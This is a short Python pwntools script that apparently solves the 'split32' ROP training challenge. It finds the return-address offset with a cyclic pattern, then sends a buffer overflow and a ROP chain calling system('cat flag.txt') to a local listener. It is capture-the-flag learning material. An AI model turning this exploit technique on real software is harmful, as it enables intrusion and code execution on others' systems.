from pwn import *

#use the following command to have the binary listening on localhost:1234
#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./split32

LOCATION = "./split32"
REMOTE   = remote("localhost", 1234) #binary listening on the machine

binary = ELF(LOCATION)
rop    = ROP(LOCATION)

def pcOffset(): 
    proc = process(LOCATION, timeout=2) #start process to fuzz
    proc.sendline(cyclic(1024))         #crash process with cyclic pattern
    proc.recvall()                      
    core = Core("core")                 #open core file
    pcOff = cyclic_find(core.pc)        #find EIP offset using cyclic finder
    return pcOff

def exploit():
    string = next(binary.search("cat flag.txt"))
    rop.system(string)          #generate ropchain to call system("cat flag.txt")
    exp  = 'A' * offset         #overflow buffer
    exp += str(rop)             #append ropchain     
    REMOTE.recvuntil('>')
    REMOTE.sendline(exp)        #send exploit
    log.success("Flag:{0}".format(REMOTE.recvall()))

offset = pcOffset()
exploit()

